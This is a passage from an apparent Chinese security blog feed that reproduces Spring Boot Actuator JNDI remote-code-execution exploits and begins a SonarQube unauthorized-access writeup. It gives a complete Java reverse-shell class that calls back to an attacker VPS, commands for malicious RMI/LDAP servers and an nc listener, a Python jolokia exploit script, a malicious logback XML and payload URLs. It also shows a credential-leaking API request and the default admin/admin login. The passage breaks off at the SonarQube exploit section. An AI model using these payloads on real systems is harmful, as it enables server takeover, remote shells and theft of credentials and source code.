class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/28ead6c984014e077070ea26b118d7f8.png" alt="image-20220106104030240"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cc8756c5571cc21eed9bf56279cbbf3d.png" alt="image-20220106104041591"></p><h3 id="步骤四：重启应用"><a href="#步骤四：重启应用" class="headerlink" title="步骤四：重启应用"></a>步骤四：重启应用</h3><p>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/797f87c8cb5430b70981a1a2a2e2be59.png" alt="image-20220106104137651"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/126d130441612bed777b368421c0bb62.png" alt="image-20220106104146393"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/3b3dfc3b3b06dd2a00c7ce9300391e91.png" alt="image-20220106105457183"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e23e570aeb09f702ee779bcad0d3a7d4.png" alt="image-20220106105418120"></p><h2 id="4-漏洞原理："><a href="#4-漏洞原理：" class="headerlink" title="4 漏洞原理："></a>4 漏洞原理：</h2><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h1 id="Springboot-jolokia-Realm-JNDI-RCE"><a href="#Springboot-jolokia-Realm-JNDI-RCE" class="headerlink" title="Springboot jolokia Realm JNDI RCE"></a>Springboot jolokia Realm JNDI RCE</h1><h2 id="1-正常访问："><a href="#1-正常访问：" class="headerlink" title="1 正常访问："></a>1 正常访问：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/709086ada9a072b3a631629b6a8db2e3.png" alt="image-20220126103125692"></p><h2 id="2-利用条件："><a href="#2-利用条件：" class="headerlink" title="2 利用条件："></a>2 利用条件：</h2><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/578f76db80c52dbf17703de5a24fd35e.png" alt="image-20220126103151134"></p><h2 id="3-利用方法："><a href="#3-利用方法：" class="headerlink" title="3 利用方法："></a>3 利用方法：</h2><h3 id="步骤一：查看已存在的-MBeans"><a href="#步骤一：查看已存在的-MBeans" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h3><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/41053aadb601abe0e153eeb0ddd4d133.png" alt="image-20220126103236857"></p><h3 id="步骤二：准备要执行的-Java-代码"><a href="#步骤二：准备要执行的-Java-代码" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h3><p>编写优化过后的用来反弹 shell 的Java 示例代码 <code>JNDIObject.java</code>。</p><p>把 JNDIObject.java 编译成 class文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 &#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;JNDIObject.java</span><br></pre></td></tr></table></figure><p>修改反弹shell的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String ip &#x3D; &quot;110.110.110.110&quot;;</span><br><span class="line">String port &#x3D; &quot;4443&quot;;</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  javac -source 1.5 -target 1.5 JNDIObject.java</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Build By LandGrey</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String ip = <span class="string">"your-vps-ip"</span>;</span><br><span class="line">            String port = <span class="string">"443"</span>;</span><br><span class="line">            String py_path = <span class="keyword">null</span>;</span><br><span class="line">            String[] cmd;</span><br><span class="line">            <span class="keyword">if</span> (!System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"windows"</span>)) &#123;</span><br><span class="line">                String[] py_envs = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/python"</span>, <span class="string">"/bin/python3"</span>, <span class="string">"/usr/bin/python"</span>, <span class="string">"/usr/bin/python3"</span>, <span class="string">"/usr/local/bin/python"</span>, <span class="string">"/usr/local/bin/python3"</span>&#125;;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; py_envs.length; ++i) &#123;</span><br><span class="line">                    String py = py_envs[i];</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> File(py)).exists()) &#123;</span><br><span class="line">                        py_path = py;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (py_path != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">"/bin/bash"</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;py_path, <span class="string">"-c"</span>, <span class="string">"import pty;pty.spawn(\"/bin/bash\")"</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;py_path, <span class="string">"-c"</span>, <span class="string">"import pty;pty.spawn(\"/bin/sh\")"</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">"/bin/bash"</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            Process p = (<span class="keyword">new</span> ProcessBuilder(cmd)).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">            Socket s = <span class="keyword">new</span> Socket(ip, Integer.parseInt(port));</span><br><span class="line">            InputStream pi = p.getInputStream();</span><br><span class="line">            InputStream pe = p.getErrorStream();</span><br><span class="line">            InputStream si = s.getInputStream();</span><br><span class="line">            OutputStream po = p.getOutputStream();</span><br><span class="line">            OutputStream so = s.getOutputStream();</span><br><span class="line">            <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">                <span class="keyword">while</span>(pi.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pi.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(pe.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pe.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(si.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    po.write(si.read());</span><br><span class="line">                &#125;</span><br><span class="line">                so.flush();</span><br><span class="line">                po.flush();</span><br><span class="line">                Thread.sleep(<span class="number">50L</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    p.exitValue();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p.destroy();</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤三：托管-class-文件"><a href="#步骤三：托管-class-文件" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h3><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h3 id="步骤四：架设恶意-rmi-服务"><a href="#步骤四：架设恶意-rmi-服务" class="headerlink" title="步骤四：架设恶意 rmi 服务"></a>步骤四：架设恶意 rmi 服务</h3><p>下载 marshalsec<a href="https://github.com/mbechler/marshalsec，使用下面命令架设对应的" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec，使用下面命令架设对应的</a> rmi 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://110.110.110.110:88/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure><h3 id="步骤五：监听反弹-shell-的端口"><a href="#步骤五：监听反弹-shell-的端口" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h3><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4443</span><br></pre></td></tr></table></figure><h3 id="步骤六：发送恶意-payload"><a href="#步骤六：发送恶意-payload" class="headerlink" title="步骤六：发送恶意 payload"></a>步骤六：发送恶意 payload</h3><p>根据实际情况修改脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需要修改的地方</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;jolokia&#x2F;&#39;</span><br><span class="line">&quot;value&quot;: &quot;rmi:&#x2F;&#x2F;110.110.110.110:1389&#x2F;JNDIObject&quot;</span><br></pre></td></tr></table></figure><p>代码：springboot-realm-jndi-rce.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1:9094/jolokia/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_realm = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:type=MBeanFactory"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"createJNDIRealm"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: [<span class="string">"Tomcat:type=Engine"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wirte_factory = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"WRITE"</span>,</span><br><span class="line">    <span class="string">"attribute"</span>: <span class="string">"contextFactory"</span>,</span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write_url = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"WRITE"</span>,</span><br><span class="line">    <span class="string">"attribute"</span>: <span class="string">"connectionURL"</span>,</span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"rmi://110.110.110.110:1389/JNDIObject"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"stop"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"start"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flow = [create_realm, wirte_factory, write_url, stop, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flow:</span><br><span class="line">    print(<span class="string">'%s MBean %s: %s ...'</span> % (i[<span class="string">'type'</span>].title(), i[<span class="string">'mbean'</span>], i.get(<span class="string">'operation'</span>, i.get(<span class="string">'attribute'</span>))))</span><br><span class="line">    r = requests.post(url, json=i)</span><br><span class="line">    r.json()</span><br><span class="line">    print(r.status_code)</span><br></pre></td></tr></table></figure><p>运行python文件</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cab2bc8b84c0f2b96591b815910cf0ca.png" alt="image-20220126142733040"></p><p>RMI服务收到请求</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b56473b013827dccb7e516abaa8bf47e.png" alt="image-20220126141535653"></p><p>VPS接收到反弹的shell</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d39eea3b4dd8e3a69a161a1f7a9e96a3.png" alt="image-20220126141801956"></p><h2 id="4-漏洞原理：-1"><a href="#4-漏洞原理：-1" class="headerlink" title="4 漏洞原理："></a>4 漏洞原理：</h2><ol><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li></ol><h1 id="Springboot-jolokia-logback-JNDI-RCE"><a href="#Springboot-jolokia-logback-JNDI-RCE" class="headerlink" title="Springboot jolokia logback JNDI RCE"></a>Springboot jolokia logback JNDI RCE</h1><h2 id="1-漏洞环境-正常访问："><a href="#1-漏洞环境-正常访问：" class="headerlink" title="1 漏洞环境,正常访问："></a>1 漏洞环境,正常访问：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/65712e89358130843912001a2aaeba79.png" alt="image-20220126092951280"></p><h2 id="2-利用条件：-1"><a href="#2-利用条件：-1" class="headerlink" title="2 利用条件："></a>2 利用条件：</h2><ul><li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p></li><li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p></li><li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p><ul><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;jolokia</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b1d5137381e44c8fea2b36c276b291b9.png" alt="image-20220126093044846"></p><h2 id="3-利用方法：-1"><a href="#3-利用方法：-1" class="headerlink" title="3 利用方法："></a>3 利用方法：</h2><h3 id="步骤一：查看已存在的-MBeans-1"><a href="#步骤一：查看已存在的-MBeans-1" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h3><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dbeada69623a9ab2e10b78c06c85d8d6.png" alt="image-20220126094044156"></p><h3 id="步骤二：托管-xml-文件"><a href="#步骤二：托管-xml-文件" class="headerlink" title="步骤二：托管 xml 文件"></a>步骤二：托管 xml 文件</h3><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"ldap://your-vps-ip:1389/JNDIObject"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="步骤三：架设恶意-ldap-服务"><a href="#步骤三：架设恶意-ldap-服务" class="headerlink" title="步骤三：架设恶意 ldap 服务"></a>步骤三：架设恶意 ldap 服务</h3><p>下载 JNDIExploit，使用下面命令架设对应的 ldap 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.3-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><h3 id="步骤四：从外部-URL-地址加载日志配置文件"><a href="#步骤四：从外部-URL-地址加载日志配置文件" class="headerlink" title="步骤四：从外部 URL 地址加载日志配置文件"></a>步骤四：从外部 URL 地址加载日志配置文件</h3><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意payload种URL</span><br><span class="line">http:!&#x2F;!&#x2F;your-vps-ip!&#x2F;example.xml</span><br><span class="line">其中 &#x2F; 都是 !&#x2F; 替代的</span><br></pre></td></tr></table></figure><p>PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;your-vps-ip!&#x2F;example.xml</span><br></pre></td></tr></table></figure><p>HTTP请求收到请求</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e2be7c18ccc25c38119941a793e0d99d.png" alt="image-20220126101113887"></p><p>JNDI收到请求</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5f42cdf0ca5bc86cbba901907eda8b2f.png" alt="image-20220126101008425"></p><p>成功命令执行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bc47ba3b50b0da8133e255558c8df3fb.png" alt="image-20220126100454427"></p><blockquote><p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p></blockquote><h2 id="4-漏洞原理：-2"><a href="#4-漏洞原理：-2" class="headerlink" title="4 漏洞原理："></a>4 漏洞原理：</h2><ol><li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li><li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><p>Spring Boot Actuator 漏洞复现合集.md</p>]]></content>
      
      
      <categories>
          
          <category> spring boot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java 后端 web安全 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SonarQube 未授权漏洞</title>
      <link href="/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞影响产品概述"><a href="#0x01-漏洞影响产品概述" class="headerlink" title="0x01 漏洞影响产品概述"></a><strong>0x01 漏洞影响产品概述</strong></h1><p>SonarQube是一款开源静态代码质量分析管理工具，支持Java、Python、PHP、JavaScript、CSS等27种以上目前极为流程的编程开发语言，同时它能够便捷集成在各种IDE、Jenkins、Git等服务中，方便及时查看代码质量分析报告。该工具在github开源社区获得6.3K的关注量，在全球颇具影响力，深得全球各研发工作者的喜爱。</p><h1 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a><strong>0x02 漏洞描述</strong></h1><p>SonarQube是一款开源静态代码质量分析管理工具，在默认配置的情况下，缺少对API 接口的访问权限控制，攻击者可利用该漏洞在未授权的情况下，通过访问api/settings/values接口从而获取到 SMTP、SVN、GitLab 凭据，进一步获取源代码数据仓库中的源代码，造成项目源代码泄露。同时还可以对使用默认账号密码的用户进行攻击，系统安装完成后，默认弱口令为admin/admin，攻击者通过输入默认账号密码，同样可以获得敏感配置信息，从而进一步窃取企业源代码。</p><h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a><strong>0x03 影响版本</strong></h1><p>此次受影响 SonarQube 版本如下：</p><table><thead><tr><th>SonarQube版本</th><th>是否受影响</th></tr></thead><tbody><tr><td>&lt;8.6</td><td>是</td></tr><tr><td>&gt;=8,6</td><td>否</td></tr></tbody></table><h1 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a><strong>0x04 漏洞验证</strong></h1><p>直接未授权访问get链接即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;api&#x2F;settings&#x2F;values HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9000</span><br><span class="line">User-Agent: python-requests&#x2F;2.26.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/73ed19f0832d098e1fadec7c86744e6b.png" alt="image-20211129105637462"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本系统常见的默认口令是 admin&#x2F;admin</span><br></pre></td></tr></table></figure><p>得有泄漏敏感信息才能有危害，有些并没有配置的话，危害就没多大了</p><p>比如存在SMTP的密钥</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0ab34a3987898ea588eb48160fc2be5e.png" alt="image-20211129110309056"></p><h1 id="0x05-漏洞利用EXP"><a href="#0x05-漏洞利用EXP" class="headerlink" title="0x05 漏洞利用EXP"></a>0x05 漏洞利用EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 